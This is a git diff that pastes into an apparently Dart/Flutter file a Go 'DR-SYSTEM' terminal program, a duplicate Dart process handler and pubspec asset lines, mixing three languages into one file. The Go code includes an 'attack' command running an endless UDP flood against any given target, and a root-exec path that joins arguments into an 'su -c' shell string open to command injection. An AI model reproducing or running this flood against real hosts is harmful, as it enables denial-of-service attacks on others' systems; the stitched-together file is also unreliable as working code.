@@ -573,5 +573,113 @@ Future<void> executeGoEngine(String command, List<String> args) async {
     terminal.write('\r\n[FATAL] No se pudo iniciar el motor: $e');
   }
 }
+// [DR-SYSTEM] - Motor Principal
+// Signature: L
+package main
+
+import (
+	"fmt"
+	"net"
+	"os"
+	"os/exec"
+	"strings"
+)
+
+// Ejecuta comandos del sistema o BusyBox (Root opcional)
+func systemExec(isRoot bool, name string, args []string) {
+	var cmd *exec.Cmd
+	if isRoot {
+		fullCmd := name + " " + strings.Join(args, " ")
+		cmd = exec.Command("su", "-c", fullCmd)
+	} else {
+		cmd = exec.Command(name, args...)
+	}
+
+	out, err := cmd.CombinedOutput()
+	if err != nil {
+		fmt.Printf("\n[DR-SYSTEM][ERROR] %v - Signature: L\n", err)
+		return
+	}
+	fmt.Print(string(out))
+}
+
+// Inundación UDP para Stress Testing
+func udpFlood(target string) {
+	connection, err := net.Dial("udp", target+":80")
+	if err != nil {
+		fmt.Printf("[ERROR] No se pudo conectar a %s\n", target)
+		return
+	}
+	defer connection.Close()
+
+	packet := make([]byte, 1024) 
+	fmt.Printf("[DR-SYSTEM] Desplegando ráfagas UDP en %s... [L]\n", target)
+
+	for {
+		_, err := connection.Write(packet)
+		if err != nil { break }
+	}
+}
+
+func main() {
+	if len(os.Args) < 2 {
+		fmt.Println("[DR-SYSTEM] Terminal Activa - Signature: L")
+		return
+	}
+
+	command := os.Args[1]
+
+	switch command {
+	case "install":
+		if len(os.Args) < 3 { return }
+		pkg := os.Args[2]
+		fmt.Printf("\r\n[DR-SYSTEM] Fetching package: %s... [L]\n", pkg)
+		// Aquí va tu lógica de unzip
+		fmt.Printf("[DR-SYSTEM] Success: %s instalado.\n", pkg)
+
+	case "whois":
+		if len(os.Args) < 3 { return }
+		systemExec(false, "busybox", []string{"whois", os.Args[2]})
+
+	case "attack":
+		if len(os.Args) < 3 { return }
+		target := os.Args[2]
+		udpFlood(target)
+
+	case "root-exec":
+		if len(os.Args) < 3 { return }
+		systemExec(true, os.Args[2], os.Args[3:])
+
+	default:
+		// Ejecuta comandos estándar vía BusyBox si no es interno
+		systemExec(false, "busybox", os.Args[1:])
+	}
+}
+// [DR-SYSTEM] Flutter Handler
+Future<void> executeGoEngine(String command, List<String> args) async {
+  final directory = await getApplicationDocumentsDirectory();
+  final path = '${directory.path}/dr-terminal';
+  
+  // Incluimos la carpeta interna en el PATH para que reconozca a busybox
+  final env = {"PATH": "${directory.path}:${Platform.environment['PATH']}"};
+
+  try {
+    final process = await Process.start(path, [command, ...args], environment: env);
+    
+    process.stdout.transform(utf8.decoder).listen((data) {
+      terminal.write(data.replaceAll('\n', '\r\n')); // Ajuste para terminales xterm
+    });
+
+    process.stderr.transform(utf8.decoder).listen((data) {
+      terminal.write('\r\n[L-ERROR] $data');
+    });
+  } catch (e) {
+    terminal.write('\r\n[FATAL] No se pudo iniciar el motor: $e');
+  }
+}
+flutter:
+  assets:
+    - assets/bin/dr-terminal
+    - assets/bin/busybox
 
 chmod 755
